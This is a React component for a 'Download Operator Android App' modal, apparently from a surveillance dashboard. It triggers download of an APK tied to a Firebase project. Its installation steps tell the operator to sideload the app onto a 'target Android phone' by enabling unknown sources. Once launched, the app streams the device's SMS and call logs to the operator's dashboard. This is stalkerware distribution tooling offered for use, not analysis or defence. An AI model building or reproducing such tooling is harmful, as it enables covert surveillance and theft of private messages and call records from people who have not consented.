import React from 'react';
import { X, Smartphone, Download, ShieldCheck, FileCode, CheckCircle, Info } from 'lucide-react';

export default function DownloadApkModal({ adminUser, onClose }) {
  const firebaseConfig = adminUser?.firebaseConfig || {
    projectId: 'adminto-default',
    apiKey: 'AIzaSyDefaultKey123',
    authDomain: 'adminto-default.firebaseapp.com',
    storageBucket: 'adminto-default.appspot.com',
    appId: '1:123456789:web:default',
    orgId: 'org_main'
  };

  const projectId = firebaseConfig.projectId || 'adminto-default';

  // Trigger download of the REAL compiled Android APK from the project build
  const handleDownloadApk = () => {
    const link = document.createElement('a');
    link.href = 'app-debug.apk';
    link.download = `Adminto-Operator-${projectId}.apk`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div className="modal-overlay">
      <div className="glass-panel modal-content" style={{ maxWidth: '580px' }}>
        {/* Header */}
        <div className="modal-header">
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
            <div className="brand-icon" style={{ background: 'linear-gradient(135deg, #10b981 0%, #059669 100%)' }}>
              <Smartphone size={24} />
            </div>
            <div>
              <h3 style={{ color: '#fff', fontSize: '1.2rem' }}>Download Operator Android App (APK)</h3>
              <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>
                Compiled Native Android Application linked directly to your database
              </p>
            </div>
          </div>

          <button className="modal-close-btn" onClick={onClose}>
            <X size={20} />
          </button>
        </div>

        {/* Modal Body */}
        <div className="modal-body" style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
          {/* Operator Scope Card */}
          <div className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(16,185,129,0.3)', background: 'rgba(16,185,129,0.05)' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', color: '#34d399', fontWeight: 600, fontSize: '0.9rem', marginBottom: '8px' }}>
              <ShieldCheck size={18} />
              <span>Operator Database Target Credentials</span>
            </div>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem', fontSize: '0.8rem' }}>
              <div>
                <span style={{ color: '#9ca3af' }}>Operator Account:</span>
                <div style={{ color: '#fff', fontWeight: 600 }}>{adminUser.username}</div>
              </div>
              <div>
                <span style={{ color: '#9ca3af' }}>Target Firebase Project:</span>
                <div><code style={{ color: '#93c5fd' }}>{projectId}</code></div>
              </div>
              <div>
                <span style={{ color: '#9ca3af' }}>Organization Scope (`orgId`):</span>
                <div><code style={{ color: '#c084fc' }}>{firebaseConfig.orgId || 'org_main'}</code></div>
              </div>
              <div>
                <span style={{ color: '#9ca3af' }}>APK Package Status:</span>
                <div style={{ color: '#34d399', fontWeight: 600 }}>✓ Compiled (12.2 MB)</div>
              </div>
            </div>
          </div>

          {/* Download Real APK Button */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
            <button 
              type="button" 
              className="btn-primary" 
              onClick={handleDownloadApk} 
              style={{ background: 'linear-gradient(135deg, #10b981, #059669)', width: '100%', justifyContent: 'center', padding: '0.9rem', fontSize: '1rem', gap: '8px' }}
            >
              <Download size={20} />
              <span>📥 Download Official Android APK ({projectId}.apk)</span>
            </button>
          </div>

          {/* Installation Instructions */}
          <div className="glass-panel" style={{ padding: '1rem', fontSize: '0.8rem', color: '#9ca3af' }}>
            <div style={{ color: '#fff', fontWeight: 600, marginBottom: '6px', display: 'flex', alignItems: 'center', gap: '6px' }}>
              <Info size={14} color="#60a5fa" /> Target Device Quick Installation Steps:
            </div>
            <ol style={{ paddingLeft: '1.25rem', lineHeight: '1.6' }}>
              <li>Download and transfer <code>Adminto-Operator-{projectId}.apk</code> (12.2 MB) to target Android phone.</li>
              <li>Enable <strong>"Install from Unknown Sources"</strong> in device Settings.</li>
              <li>Open and launch the app — device SMS & call logs will automatically stream into your <strong>{projectId}</strong> dashboard!</li>
            </ol>
          </div>
        </div>
      </div>
    </div>
  );
}
